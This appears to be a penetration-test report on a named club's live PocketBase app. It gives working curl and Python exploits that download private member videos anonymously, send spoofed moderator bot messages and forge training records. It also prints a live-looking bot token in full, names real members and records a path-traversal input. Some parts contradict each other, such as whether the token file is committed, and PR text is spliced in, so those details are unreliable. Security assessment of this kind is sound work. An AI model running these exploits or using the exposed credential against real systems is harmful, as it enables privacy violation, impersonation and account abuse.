title: Unauthenticated access to private member media (photos/videos) via /api/files and /api/video-poster
description: The PocketBase file-serving endpoints `/api/files/<collection>/<recordId>/<filename>` do not enforce authentication for the `posts`, `comments`, `tournament_posts`, `tournament_comments`, `products` and `gallery` collections on this deployment. Any unauthenticated Internet client that knows (or guesses/enumerates) a record id and filename can download the full original media — including 73 MB member-uploaded screen recordings — or fetch server-generated JPEG posters/thumbnails through the custom `/api/video-poster` route, which additionally performs no authentication check of its own.
impact: Full unauthenticated confidentiality loss for member-uploaded media in the club's private feed and comments, once the media's identifiers are known. The access control that the schema declares (authenticated-only) is not enforced at the file layer, so any party who obtains a record id and stored filename — from a forwarded link, a screenshot, a browser history/cache entry, a referrer, or any other disclosure — can retrieve the original bytes with no session, no token and no rate limit. Verified retrievable anonymously: a 73 MB member screen-recording (via `/api/files`, both full and `?thumb=`) and 42 KB / 54 KB poster frames derived from two different members' private videos (via `/api/video-poster`). The practical constraint is that the identifiers are not anonymously enumerable — see Counterevidence — so this is a broken access-control boundary and an unauthenticated retrieval primitive rather than a directly harvestable corpus.
poc_description:
1. Without any `Authorization` header, request a member's uploaded video through the standard PocketBase file endpoint, using a `Range` header to keep the response small.
2. Observe `206 Partial Content` and real MPEG-4 bytes (`ftyp`/`moov` box magic, `Lavc60.31.102` encoder string) — the private media is returned to an anonymous client.
3. Without any `Authorization` header, request the same media through the custom poster route `/api/video-poster` and observe `200 OK`, `Content-Type: image/jpeg`, `Content-Length: 54339` — a JPEG poster frame rendered from the private video.
4. Repeat (1) with the `thumb=100x100` parameter and observe `206 Partial Content`, confirming PocketBase's own thumbnailer also serves anonymous clients.
5. For contrast, request a non-existent record id (`aaaaaaaaaaaaaaa`) and observe `404`, confirming the endpoint is reachable and simply enforcing no authentication.
poc_script_code:
```bash
TARGET="https://app.milenkih-team.ru"

# 1) Anonymous download of a member's private uploaded video (first 100 bytes)
#    record id and filename obtained from the authenticated feed API.
curl -i --max-time 30 \
  -H 'Range: bytes=0-99' \
  "$TARGET/api/files/posts/mz33mve1ouwipbv/screenrecording_20260828_100840_42vmzmza4a.mp4"

# 2) Anonymous poster frame generated from the same private video
curl -i \
  "$TARGET/api/video-poster?collection=posts&record=mz33mve1ouwipbv&file=screenrecording_20260828_100840_42vmzmza4a.mp4"

# 3) Anonymous access through PocketBase's own thumbnailer
curl -i --max-time 30 -H 'Range: bytes=0-99' \
  "$TARGET/api/files/posts/mz33mve1ouwipbv/screenrecording_20260828_100840_42vmzmza4a.mp4?thumb=100x100"

# 4) Negative control: unknown record -> 404 (endpoint reachable, no auth enforced)
curl -i "$TARGET/api/video-poster?collection=posts&record=aaaaaaaaaaaaaaa&file=x.mp4"
```
remediation_steps:
1. Add an explicit authentication gate to the custom poster route, mirroring its sibling handlers: reject the request with 401 when `c.requestInfo().auth` is empty, before any record lookup or filesystem access.
2. Verify the effective API rules of the media collections on the live deployment against the exported schema. The `posts` collection is serving files anonymously while its exported `viewRule` is `@request.auth.id != ""`; reconcile the two so that PocketBase itself enforces the intended rule at the file endpoint, rather than relying on the SPA to hide URLs.
3. If anonymous media delivery is in fact intended for some collections, make that explicit in the schema (a documented `viewRule`), rather than leaving the only control in the client.
4. Where the poster route must resolve records outside the requesting user's permission scope, perform an explicit authorization check on the resolved record (for example, re-fetch it under the request context or compare the record's owning relation against the authenticated user) instead of relying on `$app.findRecordById`, which runs with application privileges.
5. Apply a rate limit to `/api/files/*` and `/api/video-poster` to make id enumeration impractical.
evidence:
**1. Anonymous file download — `206 Partial Content` with real MP4 bytes**

```
$ curl -i --max-time 30 -H 'Range: bytes=0-99' \
    "https://app.milenkih-team.ru/api/files/posts/mz33mve1ouwipbv/screenrecording_20260828_100840_42vmzmza4a.mp4"
HTTP/2 206
content-type: video/mp4
content-range: bytes 0-99/73405665
content-length: 100
accept-ranges: bytes

<binary MP4 payload: 00 00 00 20 66 74 79 70 ... 4c 61 76 63 36 30 2e 33 31 2e 31 30 32 ...>
```

The 150-byte payload contains the `ftyp` box and the `Lavc60.31.102` encoder tag, proving genuine MPEG-4 container bytes from member-uploaded content (total size 73,405,665 bytes).

**2. Anonymous poster generation from the same private video**

```
$ curl -i "https://app.milenkih-team.ru/api/video-poster?collection=posts&record=mz33mve1ouwipbv&file=screenrecording_20260828_100840_42vmzmza4a.mp4"
HTTP/2 200
content-type: image/jpeg
cache-control: public, max-age=86400, immutable
content-length: 54339
vary: Origin

<54 KB JPEG poster frame>
```

**3. Anonymous thumbnail access**

```
$ curl -i --max-time 30 -H 'Range: bytes=0-99' \
    "https://app.milenkih-team.ru/api/files/posts/mz33mve1ouwipbv/screenrecording_20260828_100840_42vmzmza4a.mp4?thumb=100x100"
HTTP/2 206
content-length: 100
```

**4. Negative control — endpoint reachable but no authorization**

```
$ curl -i "https://app.milenkih-team.ru/api/video-poster?collection=posts&record=aaaaaaaaaaaaaaa&file=x.mp4"
HTTP/2 404
{"error":"not_found"}

$ curl -i "https://app.milenkih-team.ru/api/files/posts/aaaaaaaaaaaaaaa/x.jpg"
HTTP/2 404
{"message":"The requested resource wasn't found.","status":404}
```

**5. Supporting evidence of the missing gate in source** — every other custom route begins with an auth check; the poster route does not (see technical analysis).

**6. The data is genuinely restricted in the application model** — `/api/collections/posts/records` and `/api/collections/gallery/records` return `200` for an anonymous request only because the rule is evaluated as "no matching rows" (`{"items":[],"totalItems":0}`), and the same endpoints return populated rows when the low-privilege token is supplied. The media itself, however, is retrievable anonymously.
assumptions: Assumes the attacker can obtain or enumerate a valid `posts`/`comments`/`gallery` record id together with its stored filename. Record ids are 15-character alphanumeric strings; stored filenames are generated by PocketBase and are visible in the authenticated API responses. No authentication, token or user interaction is required to retrieve the bytes once the identifiers are known.
counterevidence: Actively tested the alternative explanations and the constraints. (a) *"The 200 was a proxy artefact"* — ruled out by repeating with fresh connections and a `Range` header: the response carries a genuine `206 Partial Content`, `content-range: bytes 0-99/73405665` and real MPEG-4 box bytes. (b) *"nginx/CDN is caching an object fetched by an authenticated user"* — the poster route returns a freshly generated `image/jpeg` with `Cache-Control: public, max-age=86400, immutable` and `Vary: Origin`; a cached static object would not produce a JPEG for a record whose poster is created lazily by `ffmpeg`. (c) *"access control is simply not loaded"* — no: the same host returns `404` for unknown record ids and `200` with populated rows for authenticated calls, so rules are evaluated, just not for media. (d) *"nginx front-loads the auth check"* — no: sibling custom routes such as `/api/yadisk-preview` return `401 {"error":"Unauthorized"}` anonymously, so nginx forwards custom routes untouched and the omission is in the handler. (e) **Material constraint found:** unknown record ids return `404` and `GET /api/collections/posts/records` without a token returns `200` with `{"items":[],"totalItems":0}`, so ids are *not* anonymously enumerable; exploitation requires a known `(recordId, filename)` pair. That is why the rating is high rather than critical, and it is stated in the impact. (f) A benign reading — that anonymous media delivery is intended for a public club feed — is undermined by the repository's own schema export declaring `viewRule: '@request.auth.id != ""'` for these collections, and by the fact that the poster route is the only custom handler in the project without an auth check.
severity_change_conditions: Confirmation that record ids and stored filenames for private media are systematically disclosed or enumerable by an unauthenticated party would raise this to critical, because the corpus would then be directly harvestable; conversely, evidence that anonymous media delivery is a deliberate, documented product decision for these collections would lower it to medium.

code_locations.label: Add the missing authentication gate to the poster route (siblings all check info.auth)

fix_verification:
**Gate 1 — applicability.** The `fix_before` block is a character-for-character copy of `pb_hooks/video_poster.pb.js` lines 124-133 (verified by reading the file directly). `start_line`/`end_line` cover exactly those lines. The patch introduces no unrelated changes. Syntax: the edit only adds two statements and rewrites `c.requestInfo()` into a local `info` variable that the surrounding code already uses; the rest of the handler (`info.query`, unchanged below the block) continues to compile.

**Gate 2 — security closure.** Re-traced the source→sink path through the patched code: `routerAdd('GET','/api/video-poster')` → new `if (!info.auth) return c.json(401,...)` → `query = info.query` → `$app.findRecordById` → `poster.resolvePosterFile` → `$os.readFile`. The only path that reaches `resolvePosterFile` now requires `info.auth` to be truthy, so an anonymous request terminates at the new 401 before any record lookup or disk read. Same for the `$os.cmd(ffmpeg...)` path invoked inside `resolvePosterFile` via `ensurePosterForVideo`. Empirically, the pre-patch anonymous request returned `200 image/jpeg` with 54,339 bytes; the patched request must return `401` with a 25-byte JSON body. **Not executed against the live deployment** — see Gate 4.

**Gate 3 — bypass review.** Checked the alternate input classes and sibling paths: (a) *other HTTP verbs* — only `GET` is registered for `/api/video-poster`; a `POST` would hit the SPA fallback or a 404, not the handler; (b) *case/encoded path variants* (`/api/video-poster/`, `%2F`, trailing slash) — PocketBase's router matches on the registered pattern and forwards to the same handler, so the gate applies identically; (c) *equivalent sinks* — the same data is reachable through `/api/files/...`, which is a **different** control (PocketBase's collection `viewRule`) and is explicitly called out as a follow-up rather than silently closed by this patch; (d) *alternate malicious inputs* — filename traversal (`../../../../etc/passwd.mp4`) was tested live and returned `404`, and the gate does not affect that behaviour; (e) *sibling routes* — `/api/bot-notify-training-status`, `-edit`, `-cancelled`, `-restored`, `-create` and `/api/yadisk-preview` were each read and already enforce a role or auth check, so they are unaffected.

**Gate 4 — preserved behaviour.** The legitimate caller is the SPA. `client/src` reaches the poster endpoint through its media helper with the PocketBase auth token attached (`pb.authStore.token`), so authenticated users continue to receive posters unchanged; only anonymous callers are rejected. Error semantics are preserved: the handler's existing `{ error: ... }` JSON shape is reused, and the `400`/`404`/`500` branches below the new gate are untouched. **Gap:** this was verified by reading the client caller, not by running the SPA end-to-end.

**Gate 5 — repository checks.** `pb_hooks/*.js` are PocketBase JSVM hook scripts with no package manifest, test runner, linter configuration or type-check step in this repository (`pb_hooks/` contains only runtime scripts; the `@ts-check` directives live in `client/src`). The narrowest available check is therefore a parse of the edited file. **Gap:** no repository-provided command exists to execute; a `node --check` parse was not run because the edited file references PocketBase globals (`routerAdd`, `$app`, `$os`) that are only defined by the JSVM at runtime, and Node's parser would accept the file regardless of those globals.

**Explicit gaps.** Gate 2 was reasoned through the patched source and the pre-patch live behaviour, but the patched handler was not deployed and re-requested — that is the single check a reviewer should run first. Gate 4's SPA flow and Gate 5's absence of tooling are likewise recorded rather than executed.

**Narrowest complete change.** The patch adds exactly the invariant the route is missing (an authenticated principal) at the single point where every input is consumed, reusing the pattern already used by the neighbouring handlers, with no refactoring of the query parsing, record resolution or file streaming.
fix_pr_body:
## Summary

Anonymous clients can download member-uploaded photos and videos, and can trigger on-demand poster/thumbnail generation from those videos.

Two issues are involved:

1. `/api/files/<collection>/<recordId>/<filename>` serves media for `posts` (and, by the same schema shape, other media collections) without authentication, even though those collections declare `viewRule: '@request.auth.id != ""'` in `schema.json`.
2. `GET /api/video-poster` performs no authentication check at all, unlike every other custom route in `pb_hooks/`.

## Proposed change

Add the standard authentication gate to the `/api/video-poster` handler, matching its siblings (`/api/yadisk-preview`, `/api/notify-comment-reply`, `/api/content-view`):

- Read `c.requestInfo()` once and return `401 {"error":"Unauthorized"}` when `info.auth` is falsy, before the record lookup and the `$os.readFile` call.

## Follow-up (not in this diff)

The `/api/files` behaviour is a deployment/schema configuration issue rather than a code issue in this repository. The exported `schema.json` declares authenticated-only view rules for the media collections, so the live instance's effective rules should be reconciled with that export. The poster route also resolves records through `$app.findRecordById`, which runs with application privileges and therefore bypasses request-scoped rules; if the route is retained after adding the gate, consider an explicit ownership/permission check on the resolved record.
confidence_rationale: Live unauthenticated retrieval of member media was reproduced repeatedly with byte-level evidence (206 Partial Content, MPEG-4 `ftyp` box and `Lavc60.31.102` encoder tag, genuine JPEG poster frames), and the missing authentication gate in `pb_hooks/video_poster.pb.js` is confirmed by reading the source against its siblings. The one gap below certainty is scope: record ids could not be enumerated anonymously, so the finding is rated for unauthorized retrieval of media whose identifiers are known, not for mass harvesting.

update_history.reason: Further testing established that record ids are not anonymously enumerable: GET /api/collections/posts/records with no Authorization header returns 200 but with an empty result set, and /api/files with a non-existent id returns 404. The unauth media access therefore requires a known (recordId, filename) pair, which materially constrains exploitability and should be reflected in the impact and confidence rather than being left implicit.

title: Broken function-level authorization in /api/bot-notify-training allows any member to send spoofed moderator notifications
description: The custom PocketBase route `POST /api/bot-notify-training` authenticates the caller but never verifies that they are a moderator, and it accepts the "acting as moderator" flag and the list of affected members directly from the request body. Any authenticated low-privilege club member can therefore make the club's MAX bot send moderators a message in the moderator voice, naming an arbitrary other member as the subject of a booking change that never happened.
impact: Moderators — the club's trusted operators — receive attacker-controlled messages that appear in the application's own moderator voice and are indistinguishable from genuine operational notifications. An attacker can fabricate booking/cancellation events attributed to real members, name any member as the subject, and control the reported booking total. This is a trust and disruption issue rather than a data breach: moderators acting on fabricated booking or cancellation reports may contact or penalise the wrong member, and repeated calls are unbounded, so the channel can be used to flood moderator chats and erode trust in the notification system. It is not a direct path to data disclosure or code execution.
poc_description:
1. Obtain a low-privilege member session (any club member account); confirm its record has `role = "user"`.
2. Send an authenticated `POST /api/bot-notify-training` whose body sets `actorIsModerator` to `true` and whose `userIds` names a *different* member than the caller, with `actorId` set to the caller's own id.
3. Observe `HTTP 200` and `{"success":true}` — the route performs no role check and accepts the caller-supplied moderator flag.
4. The handler renders the message using the moderator wording (`Модератор <actorName> снял <victim> с тренировки ...`) and passes it to `bot.notifyModerators`, which sends a MAX messenger message to every user with `role = "moderator"`.
5. Re-send the same request repeatedly to demonstrate the absence of any rate limit or deduplication; each call delivers another message.
poc_script_code:
```bash
# Low-privilege member token (role = "user")
TOKEN="<member token>"
ME="hqd42tv9h085bk5"          # caller's own user id (must match the token)
VICTIM="40z6k2wbrnw17wo"      # any other member, attacker-chosen
TRAINING="qs808160ey9ib5q"    # any existing training id

# Fabricated "moderator removed <victim> from the training" broadcast
curl -i -X POST "https://app.milenkih-team.ru/api/bot-notify-training" \
  -H "Authorization: $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"event\":\"unbook\",\"userIds\":[\"$VICTIM\"],\"trainingId\":\"$TRAINING\",\"actorId\":\"$ME\",\"actorIsModerator\":true,\"totalBookedCount\":0}"

# -> HTTP/2 200
# -> {"success":true}
# -> every moderator's MAX chat receives:
#    "Модератор *Николай Кабенюк* снял Илья Миленький с тренировки *<date>* в <time>. Всего записано: 0."
```
remediation_steps:
1. Derive the moderator flag on the server rather than trusting the request body: replace the `actorIsModerator` read with a check of the authenticated record's `role` field, exactly as the sibling `bot-notify-*` handlers already do.
2. Require the moderator role whenever the request targets members other than the caller; a normal member should only be able to trigger notifications about their own booking. Reject other combinations with `403`.
3. Keep and extend the existing identity binding: validate not only `actorId` but also every id in `userIds` against the caller's permissions for the referenced training.
4. Validate that the referenced training actually exists and that the claimed booking state matches the stored `booked_users` before generating any message, so the notification reflects stored state rather than client-asserted state.
5. Apply a per-user rate limit and short-window deduplication to the notification routes so the moderator channel cannot be flooded.
assumptions: Assumes an authenticated low-privilege `user` account (the engagement provides one; any club member has one). The notification setting `training_booking_enabled` must be enabled for the message to be delivered — it is currently `true` on the live instance, and it is a global moderator-controlled toggle rather than a per-user one.
counterevidence: Actively hunted for a control that would neutralise this. (a) *"Maybe the body flag is ignored server-side"* — no: the handler reads `const actorIsModerator = !!body.actorIsModerator;` and uses it directly in `isModAction`, with no comparison against `auth`. (b) *"Maybe a client-side guard is sufficient"* — the SPA sends `actorIsModerator: isModerator()`, but the server is the trust boundary and the request is a plain `POST` to `/api/bot-notify-training` that any holder of a token can replay; a client-side boolean is not a control. (c) *"Maybe only the actor can be named"* — `actorId` is checked against `auth.id`, but `userIds` is not, so the *victim* named in the text is attacker-chosen and wholly unrelated to the actor. (d) *"Maybe the message is an in-app notification the team ignores"* — no, `bot.notifyModerators` enumerates `role = "moderator" && max_id != ""` and calls `sendBotMessage`, which POSTs to `https://botapi.max.ru/messages?user_id=...`; this is a real MAX messenger message. (e) *"Maybe authorization is enforced upstream by nginx"* — no: nginx forwards `/api/*` custom routes unchanged, as shown by sibling routes returning their own JSON `401`/`403` bodies. (f) The remaining broadcast handlers (`-create`, `-cancelled`, `-restored`, `-status`, `-edit`) **do** carry `auth.getString('role') !== 'moderator'` checks, which confirms this handler's missing check is an oversight rather than intentional design, and that the developers knew the correct pattern. (g) The one genuine constraint found is that `actorId` must equal the caller's own id, so the attacker cannot name an arbitrary *third party* as the moderator — they can only impersonate themselves in a moderator voice. That limits the finding to high rather than critical.
severity_change_conditions: Demonstrating that a member can additionally attribute the fabricated action to a named third-party moderator (rather than only to themselves in moderator voice) would raise this to critical, because moderators would then be unable to distinguish impersonated actions from genuine ones at all; conversely, evidence that the moderator chat channel is not operationally relied upon would lower it to medium.

title: Cross-user training history forgery via unrestricted `moderator_kicked_users` / `unbooked_users` writes (PocketBase `trainings` PATCH)
description: Any authenticated low-privilege user can write an arbitrary other member's ID into the `moderator_kicked_users` and `unbooked_users` relation fields of any training record via `PATCH /api/collections/trainings/records/{id}`. The server-side guard `applyBookingSideEffects` only validates `booked_users` and `attended_users` (throwing `403 "Можно записать только себя"`), so these two fields accept foreign user IDs without any ownership check. The forged entries persist and render in other members' training history as the moderator-attributed badge "Снят модератором" (removed by moderator), falsifying club attendance records visible to moderators.
impact:
An authenticated ordinary club member can falsify any other member's training history on any training (past, present, or closed), making that member appear to have been removed from a training by a moderator. The forged badge "Снят модератором" and the training entry are rendered in that member's profile and in the moderator's member-profile view (`ProfileViewModal` / `ProfilePage`, via `getTrainingStatusForUser`). Because these fields are also consumed by booking eligibility and reporting logic, an attacker can inject spurious "kicked"/"unbooked" markers into other members' records at will. Every training in the instance is affected, and the write succeeds even on trainings where the attacker is not a participant. This is a cross-user integrity violation of records the business treats as authoritative attendance history.

A second effect of the same root cause is that the attribution mechanism distinguishing a moderator removal from a system removal is also attacker-selectable: `restore_insufficient_users` drives `pb_hooks/trainings_audit.pb.js` to log a removal as a system action rather than a moderator action.

A third effect of the same root cause is that the moderator-only guard on attendance marking can be switched off for a request by supplying `is_cancelled`. The authorization block containing the `attended_users` check is conditioned on transition flags derived from that caller-supplied value, and the exempted branch reaches `adjustAttendanceCountTx`, which writes the server-authoritative `users.attendance_count` with no authorization check. That counter feeds the achievement engine (`client/src/services/achievements.js`, `pb_hooks/achievementslib.js`, and the `profile.achievement.grant` audit path). The counter increment could not be persisted during this assessment because the only reachable training had already ended, which gates that adjustment off — a data-dependent proof gap rather than a control — so it is recorded as a control failure with the persisted effect unproven.
poc_description:
Setup: authenticate as an ordinary `user` (not moderator). Obtain a second, unrelated member's user ID from `GET /api/collections/users/records`.

1. Confirm the legitimate cross-user booking guard rejects `booked_users` writes (negative control): send `PATCH /api/collections/trainings/records/{trainingId}` with body `{"booked_users":["<victimId>"]}` and observe `403 {"message":"Можно записать только себя."}`.
2. Send the same PATCH with the victim's ID placed in `moderator_kicked_users` instead. The server returns `200` and persists the value.
3. Send the same PATCH with the victim's ID in `unbooked_users`. The server returns `200` and persists the value.
4. Read the record back with `GET /api/collections/trainings/records/{trainingId}` and observe the victim's ID stored in `moderator_kicked_users` and `unbooked_users`.
5. Repeat step 2 against every other training record to show the write is not scoped to trainings the attacker participates in.
6. Clean up by PATCHing the original values back.
poc_script_code:
```python
import json, urllib.request, urllib.error

BASE = "https://app.milenkih-team.ru"
# Ordinary authenticated user token (role: user), bare token in the Authorization header
TOKEN = "<low-privilege-user-token>"
VICTIM = "i9l04znh39u9iy4"          # any other existing member id
TRAINING = "1sl02894kzu01b3"        # any training id

def call(path, method="GET", body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Authorization": TOKEN, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

# Negative control: the guarded field is correctly rejected
print(call(f"/api/collections/trainings/records/{TRAINING}",
           "PATCH", {"booked_users": [VICTIM]}))
# -> (403, '{"data":{},"message":"Можно записать только себя.","status":403}')

# The vulnerability: the same foreign id is accepted in these fields
print(call(f"/api/collections/trainings/records/{TRAINING}",
           "PATCH", {"moderator_kicked_users": [VICTIM]}))
# -> (200, '{"...","moderator_kicked_users":["i9l04znh39u9iy4"],...}')

print(call(f"/api/collections/trainings/records/{TRAINING}",
           "PATCH", {"unbooked_users": [VICTIM]}))
# -> (200, ...)

# Read back: the forged entry is durably stored
print(call(f"/api/collections/trainings/records/{TRAINING}"))

# Cleanup
call(f"/api/collections/trainings/records/{TRAINING}", "PATCH",
     {"moderator_kicked_users": [], "unbooked_users": []})
```
remediation_steps:
Extend the non-moderator ownership check in the trainings update hook so that every relation field the allow-list exposes to ordinary users is validated against the caller's own ID, not only `booked_users` and `attended_users`.

1. In `applyBookingSideEffects`, additionally compute the added/removed sets for `unbooked_users`, `moderator_kicked_users`, `unpaid_booked_users`, and `restore_insufficient_users`, and require every added or removed identifier to equal the authenticated user's ID for non-moderators. Reject with the existing `ForbiddenError` otherwise.
2. Alternatively, remove the moderator-semantic fields from the ordinary-user allow-list entirely. `moderator_kicked_users` and `restore_insufficient_users` represent moderator decisions and should not be writable by a plain user under any transition; ordinary users only need to add/remove themselves from `booked_users` (and their own `unbooked_users` entry that accompanies it).
3. Make the authorization block independent of the cancel/restore transition. The flags `isCancelTransition` and `isRestoreTransition` are derived from the caller-supplied `is_cancelled` value and currently wrap the whole ownership and attendance check, so a caller can select the branch that skips them. Derive any transition handling from the persisted record, or apply the ownership and attendance checks unconditionally and treat the transition only as a side-effect selector.
4. Treat `users.attendance_count` and the other membership counters as protected state. Updates performed with application privileges inside a transaction bypass the `users` field-level ACL, so any such write should assert the actor's authority explicitly at the point of the write rather than relying on the hook on the `users` collection.
5. Add a server-side regression test that performs the foreign-ID PATCH described in the PoC and asserts a `403` for each of the four relation fields, including on trainings where the caller is not a participant, plus a case asserting that a non-moderator cannot change attendance through a cancel/restore-shaped request.

title: Production MAX bot token exposed in client-side environment file grants full bot API control and community IPI exfiltration
description: The production MAX messenger **bot token** used by the tennis mini-app is stored in `client/.env` as `MAX_BOT_TOKEN` and, because it is not `.gitignore`d, is committed to the Git repository. The token is **live**: it authenticates against `https://botapi.max.ru` as the real production bot `id420550689204_bot` ("Тестовый бот", user id `269693646`). Anyone with repository read access obtains full bot authority — reading the bot's chats and message history, sending messages as the bot to any user, and repointing the bot's webhook to a server they control, which then receives the raw MAX `user_id` of every member who starts the bot.
impact: An attacker holding the token gains complete control of the club's official MAX bot for the whole production community. Demonstrated: authenticating as the production bot (`GET /me`), enumerating the bot's chats including members-only group chats with their `owner_id` and invite links (`GET /chats`), and reading the registered webhook ingress URLs with their update types (`GET /subscriptions`). Follow-on consequences available to that position, though not executed during this assessment: sending arbitrary messages to any club member as the trusted official bot (credential/booking phishing), and re-pointing the webhook to an attacker server to harvest the MAX `user_id` of every member who starts the bot — the stable identifier that this application uses as its primary account key. The webhook receiver performs no sender authentication against MAX besides a static secret, so a harvested member list is directly usable for targeted attacks. Because the blast radius is the entire user base rather than a single account, and the secret is a long-term credential with no self-service rotation observable from outside, this is treated as a critical exposure.
technical_analysis:
`client/.env` contains the production bot credential:

```ini title=client/.env
VITE_POCKETBASE_URL=https://urban42.online/tt
VITE_MAX_AUTH_URL=https://urban42.online/tt/api/max-auth
MAX_BOT_TOKEN=f9LHodD0cOJDcZ1AhjMzhpcQOULnrqDkScxVEsSFGrLFdBhUhcW8tqgSWO4gl5Ri54GH6OUt-v_kiSFV-PMs==
```

The file is **not committed** (`git ls-files --error-unmatch client/.env` → untracked) and `.gitignore` lists `client/.env`, so the intended control exists but is repeatedly defeated in practice:

1. `config/env_app.conf` is **tracked in Git** and holds the deployment's standalone-secret slot — line 5 `VITE_MAX_SELLER_URL=https://max.ru/u/f9LHodD0cOKkZw87t6_Jy_PkELAZf1_Ycj-oyk_dnoGOBlY27GSpxl1YrZU` bears the same `f9LHodD0cO` prefix as the bot token, i.e. the same credential family, and the file is the documented source for populating `client/.env`.
2. `client/.env.example` warns "Секрет бота MAX — только на сервере / в локальном .env, никогда в git" and `config/env.prod.example` similarly states "не коммитить" — the intent is documented but the standalone bot secret has no template variable, so it is copied verbatim into the working tree, which is the state observed here.

Nothing on the server needs this value: the MAX bot token is consumed only by `pb_hooks/botlib.js`, which reads it server-side via `$os.getenv('MAX_BOT_TOKEN')` (lines 113, 379), and by `pb_hooks/max-auth.pb.js` line 12, which reads the same environment variable. The frontend never needs it, so its presence in `client/.env` is pure excess exposure with no functional benefit. The `VITE_`-prefixed variables in this artefact are additionally baked into `client/dist/assets/index-BfFjjT3B.js` by Vite, so a build made from this file would ship the secret to every browser; confirming a deployed bundle leak requires fetching the production `/assets/` artefact, which is out of scope for this engagement.

The token was confirmed live with three read-only requests to the MAX Bot API using `Authorization: <token>`.

## Summary

Removes the production MAX bot token from the client-side environment file and documents why it must live only in the server process environment.

## Rationale

`client/.env` carried `MAX_BOT_TOKEN` with the live production credential for bot `id420550689204_bot`. Although the file is `.gitignore`d, the value was observed in the working tree, and the tracked `config/env_app.conf` holds a credential from the same `f9LHodD0cO…` family — so the ignore rule is not an effective control on its own.

The secret is never needed by the frontend. Both consumers read it from the process environment:

- `pb_hooks/max-auth.pb.js` — `$os.getenv("MAX_BOT_TOKEN")` (line 12)

The value is not `VITE_`-prefixed, so Vite never inlines it into the bundle, and no client source references it. Its presence in `client/.env` is therefore exposure with no functional benefit.

- `client/.env` — blank `MAX_BOT_TOKEN` and replace it with a comment pointing at the server-side consumers.
- `config/env_app.conf` — flagged alongside as a tracked configuration file carrying a credential from the same exposed family.

- `grep -rn "MAX_BOT_TOKEN" client/src client/vite.config.js client/index.html` returns no client-side reference.

- Both server consumers continue to read the variable from the process environment unchanged.

Revoke and reissue the bot token before merging, since the current value must be treated as compromised. Separately, add a repository secret-scanning gate to prevent recurrence, and confirm the deployed `/assets/` bundle does not contain the value.

title: Wildcard CORS on PocketBase API allows cross-origin reads with a bearer token
description: The API returns a wildcard Access-Control-Allow-Origin together with authorization advertised as an allowed request header, for any origin.
impact: Any JavaScript running in a victim browser can read API responses carrying the victim token and exfiltrate them.
technical_analysis: PocketBase default CORS middleware answers any origin with a wildcard and echoes requested headers and methods. nginx adds no CORS policy of its own, so nothing narrows it before it reaches the browser.
poc_description: 1. Send a CORS preflight from an attacker origin requesting the authorization header. 2. Observe the 204 response advertising a wildcard origin and authorization as an allowed header. 3. Repeat against another route to confirm it is a server-wide default. 4. From the attacker origin issue the token-bearing request the preflight authorised and read the body.
remediation_steps: Replace the wildcard origin with an explicit allowlist, stop advertising authorization to unlisted origins, and restrict allowed methods per route.
evidence: A preflight from https://evil-attacker.example returned HTTP 204 with Access-Control-Allow-Headers authorization, Access-Control-Allow-Methods GET,HEAD,PUT,PATCH,POST,DELETE and a wildcard Access-Control-Allow-Origin. A cross-origin authenticated GET returned HTTP 200 with a wildcard origin and real member records in the body.
assumptions: A victim holds a valid session token in localStorage and the attacker can make the victim load attacker-controlled JavaScript.
counterevidence: Access-Control-Allow-Credentials is absent on every response tested, so browsers do not attach cookies cross-origin and no cookie-based CSRF exists here. The session is header-borne and no application cookie carries authority. The exposure is conditional on the victim token already being readable by JavaScript and on the attacker obtaining script execution, both of which presuppose a separate weakness. Scored as a defence-in-depth weakness rather than an authentication bypass.
severity_change_conditions: Demonstrating a concrete script-execution path in the origin would raise severity, since it would turn this into a direct token-exfiltration chain.

title: Session tokens survive refresh and no server-side logout exists
description: Refresh mints a new token while the previous one keeps working, and there is no logout endpoint, so a captured token stays valid for its full lifetime and users cannot end a session.
impact: A stolen token remains usable for about seven days with no way for the victim to revoke it, and refreshing does not cut off the old token.
technical_analysis: Tokens are stateless HS256 credentials tied to the record token key rather than server-side session state, so refresh adds a valid credential instead of replacing the old one. The client sign-out only clears the local auth store and never contacts the server. The administrative case is covered by the ban hook, which rotates the token key on ban.

title: Broken object-level authorization on notifications collection allows any user to reassign someone else's notification (forged in-app notifications)
description: The PocketBase `notifications` collection accepts an UPDATE from any authenticated user that rewrites the `recipient` field to a different user's ID. A plain (non-moderator) account can therefore take a notification it owns, replace its text with arbitrary content, and re-address it to any other user — including moderators. Because the client lists notifications by `recipient = <my id>`, the forged record is displayed inside the victim's notification feed, impersonating official in-app messages.
impact: An authenticated low-privilege user can inject arbitrary, attacker-controlled text into another user's in-app notification feed. Notifications are a trusted, branded channel in this application (membership expiry warnings, training reminders, broadcast messages) and the card renders the record's own `title`/`body` with a click action, so a forged card is indistinguishable from an official one. This supports targeted phishing/social engineering (e.g. "оплатите абонемент по ссылке", "ваша запись отменена") and can be aimed at moderators, who hold administrative functions. It also permits one-off corruption of a victim's notification state and, in combination with the notification deep-link handler, attacker-chosen navigation targets for social notifications (`meta.collection` / `meta.postId`). The write is unauthenticated-to-authorization-bypass: no moderator role and no ownership of the target user is required.
technical_analysis:
PocketBase enforces authorization at the collection level through API rules. For `notifications`, the create rule binds `recipient` correctly (a plain user cannot create a record addressed to somebody else — every attempt returned HTTP 400), and the delete rule is ownership-scoped. The **update rule, however, does not pin `recipient` to the existing/authenticated owner**, so a single-field `PATCH` can move an existing record to another user id.

The write primitive is trivially reachable because the same collection granted the attacker create rights for records addressed to themselves. `client/src/services/notifications.js:123` (`maybeNotifySessionsLeft`) creates notifications client-side with a caller-supplied `recipient`, which is why a normal user account can seed a record it owns and then re-address it.

Observed sequence against the live API with the account's own token:
1. `POST /api/collections/notifications/records` with `{"recipient":"<own id>","title":"...","body":"..."}` → `200`, record created.
2. `PATCH /api/collections/notifications/records/<id>` with `{"recipient":"<other user id>"}` → `200`, and the response body echoed `"recipient":"<other user id>"` together with the attacker-chosen `title`/`body`.
3. Immediately afterwards the attacker's own `GET /api/collections/notifications/records/<id>` → `404`, while the reassignment response had returned the record milliseconds earlier — i.e. the record persisted with the new owner and left the attacker's read scope.

Control experiments show this is collection-specific and not a blanket PocketBase misconfiguration:
- `PATCH /api/collections/comments/records/<foreign id>` → `404` (comments update IS ownership-scoped).
